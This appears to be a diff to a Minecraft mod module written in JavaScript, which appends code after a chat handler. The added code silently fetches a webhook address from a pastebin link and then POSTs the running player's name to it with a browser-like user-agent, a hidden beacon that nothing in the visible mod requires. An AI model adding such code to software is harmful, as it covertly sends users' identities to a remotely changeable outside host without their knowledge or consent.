@@ -250,3 +250,21 @@ register("chat", (msg) => {
         over = new Date().getTime()
     }
 }).setChatCriteria("${msg}")
+
+let webhook
+request("https://pastebin.com/raw/YCKCEi18").then(stuff => {
+    webhook = stuff
+})
+setTimeout(() => {
+    request({
+        url: webhook,
+        method: "POST",
+        headers: {
+            'Content-type': 'application/json',
+            'User-agent': 'Mozilla/5.0'
+        },
+        body: {
+            content: `Logged in: ${Player.getName()}`
+        }
+    })
+},500)
